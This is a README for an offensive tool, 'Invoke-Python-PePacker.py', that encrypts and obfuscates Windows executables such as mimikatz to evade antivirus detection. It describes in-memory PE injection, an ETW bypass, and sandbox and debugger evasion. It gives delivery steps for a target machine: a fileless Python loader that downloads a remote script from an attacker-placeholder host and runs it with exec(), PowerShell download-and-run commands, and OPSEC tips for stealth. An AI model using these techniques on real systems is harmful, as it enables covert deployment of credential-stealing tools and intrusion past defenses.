### Invoke-Python-PePacker.py
--------------------------------------
'Invoke-Python-PePacker.py' allows to pack and encrypt offensive PE files (x64 exe) in order to bypass AV solutions such as Windows Defender.
It generates an obfuscated and encrypted Python script that embeds the PE file that you want to pack and implements several antivirus bypass and defense evasion techniques.

#### FEATURES
  - Reflective PE injection in-memory using the 'PythonMemoryModule'
  - PE encryption (XOR) and compression (Zlib)
  - Script obfuscation (function and variable names are randomized + multiple encoding layer)
  - ETW bypass in user-mode (patching 'NtTraceEvent')
  - Basic sandbox detection and evasion (Delayed execution + Terminates execution if a debugger is detected)
  - Compatible with many offensive security tools (x64 EXE, unmanaged code, no GUI) such as mimikatz, pplblade, etc.

#### USAGE
- STEP 1. Generate an obfuscated and encrypted Python script that contains your PE file (e.g. mimikatz.exe, pplblade.exe).
          If you want to add arguments to pass to your PE file during its execution in-memory, you need to add them in the script 'Invoke-Python-PePacker.py'
          before running it.
```
Basic example for mimikatz
---------------------------
1. Edit the script 'Invoke-Python-PePacker.py'
   + Example 1 - You want to run mimikatz with the argument 'coffee' 
     > pythonmemorymodule.MemoryModule(data={pe_var}, command =' coffee')
   + Example 2 - You want to run mimikatz (interactively) with no argument
     > pythonmemorymodule.MemoryModule(data={pe_var})

2. Run the script 'Invoke-Python-PePacker.py' to generate an obfuscated Python script that embeds mimikatz
+ C:\path\python-3.10.4> python.exe .\Invoke-Python-PePacker.py ".\mimikatz.exe" ".\obfuscated_script.py"
```

- STEP 2. Multiple options exist to download & execute the obfuscated Python script (embeding you offensive PE) on a target Windows computer.

  - Option A: Utilize a portable signed Python 3 interpreter (www.python.org) + Fileless delivery of the obfuscated Python script.
```
1 - Download a Zip archive file on your target Windows computer that contains a signed portable Python 3 interpreter from 'www.python.org'
    as well as the Python 'MemoryModule' from the Github project 'https://github.com/naksyn/PythonMemoryModule'.
    Example:
    PS C:\temp\python> wget -uri https://your-IP-or-website/python-3.10.4-with-MemoryModule.zip -OutFile C:\temp\python\python.zip
    PS C:\temp\python> tar -xf .\python.zip; del .\python.zip;

2 - Download from a remote web server and execute directly in memory the obfuscated Python script (embeding you offensive PE) on the target
    Windows machine using Python. This fileless delivery technique enhances stealth and helps evade static antivirus detection.
    Example:
    --------
    C:\temp\python> type .\Python-fileless-delivery.py
    #Python3
    import urllib.request
    request = urllib.request.Request('http://your-IP-or-website/obfuscated_script.py')
    result = urllib.request.urlopen(request)
    payload = result.read()
    exec(payload)

    C:\temp\python> python.exe .\Python-fileless-delivery.py 
```
  - Option B: Utilize a portable signed Python 3 interpreter (www.python.org) + Download the obfuscated Python script locally before execution.
```
1 - Download a Zip archive file on your target Windows computer that contains a signed portable Python 3 interpreter from 'www.python.org'
    as well as the 'PythonMemoryModule' from the Github project 'https://github.com/naksyn/PythonMemoryModule'.
    Example:
    PS C:\temp\python> wget -uri https://your-IP-or-website/python-3.10.4-with-MemoryModule.zip -OutFile C:\temp\python\python.zip
    PS C:\temp\python> tar -xf .\python.zip; del .\python.zip;

2 - Download and store locally on disk the obfuscated Python script (embeding you offensive PE) before executing it with Python.
    While obfuscation and encryption help evade static analysis by most antivirus solutions, this approach may offer reduced stealth compared to in-memory execution.
    Example:
    --------
    C:\temp\python> powershell -c "wget -uri https://your-IP-or-website/obfuscated_script.py -OutFile C:\temp\python\obfuscated_script.py"
    C:\temp\python> python.exe .\obfuscated_script.py
```
  - Option C: Use PyInstaller to bundle the obfuscated Python script into a single executable (e.g. script.exe) and then download and execute it on a target Windows computer.


#### OPSEC advices
- Remove all existing comments in the script (loader template) before generating the obfuscated Python script (embeding you offensive PE).
- When possible use fileless delivery technique to enhance stealth and evade static antivirus detection.
  
#### LICENSE
  - GNU General Public License v3.0
